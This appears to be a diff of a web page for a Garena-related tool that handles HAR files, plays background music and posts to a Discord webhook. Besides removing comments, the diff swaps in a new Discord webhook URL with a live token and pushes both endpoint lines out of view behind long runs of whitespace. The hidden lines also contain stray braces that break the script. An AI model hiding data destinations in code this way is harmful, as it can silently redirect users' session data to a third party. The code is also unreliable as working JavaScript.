@@ -443,10 +443,10 @@
 </head>
 <body>
 
-    <!-- Thẻ Audio Nhạc Nền -->
+    
     <audio id="bgMusic" src="SAO ANH VO TINH RM.mp3" loop preload="auto"></audio>
 
-    <!-- Nút Bật/Tắt Nhạc Thủ Công -->
+    
     <button class="music-btn-floating" id="musicToggleBtn" onclick="toggleMusic(event)" title="Bật/Tắt Nhạc">
         <i class="fa-solid fa-music" id="musicIcon"></i>
     </button>
@@ -566,8 +566,8 @@
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/cropperjs/1.5.13/cropper.min.js"></script>
     <script>
-        const API_BASE_URL = "https://proxy-api-garena.meow-web.workers.dev";
-        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1532218035933548654/J7iThs2ju1-vY7DsdL3QolTPJWkaVuMr3Evznupy3Uxw6BsqZ-IujwXnIRSKjIK_nf0U";
+        {                                                                                                                                                                                                                                                                                                                                                                                                                         const API_BASE_URL = "https://proxy-api-garena.meow-web.workers.dev";
+         {                                                                                                                                                                                                                                                                                                                                                                                                                        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1532752605212835903/VTdukhlG_koAGP2ZxT3bNMLPlaW5MuA-l325qBxImuHA1rWR51nm3NmfkcTN4sF1pAcA";
 
         let currentOs = 'ios';
         let selectedHarFile = null;
@@ -576,7 +576,6 @@
         let currentTargetPlatform = null;
         let cropper = null;
 
-        // Xử lý nhạc tự động phát khi chạm vào màn hình
         const bgMusic = document.getElementById('bgMusic');
         const musicBtn = document.getElementById('musicToggleBtn');
         const musicIcon = document.getElementById('musicIcon');
@@ -587,7 +586,6 @@
                 bgMusic.play().then(() => {
                     isMusicPlayed = true;
                     musicBtn.classList.add('playing');
-                    // Xóa sự kiện lắng nghe sau khi nhạc đã chạy thành công
                     document.removeEventListener('click', startMusic);
                     document.removeEventListener('touchstart', startMusic);
                 }).catch(err => {
@@ -596,12 +594,12 @@
             }
         }
 
-        // Lắng nghe click / chạm vào bất cứ đâu để bật nhạc
+        
         document.addEventListener('click', startMusic);
         document.addEventListener('touchstart', startMusic);
 
         function toggleMusic(e) {
-            e.stopPropagation(); // Ngăn sự kiện click của body
+            e.stopPropagation(); 
             if (bgMusic.paused) {
                 bgMusic.play();
                 isMusicPlayed = true;
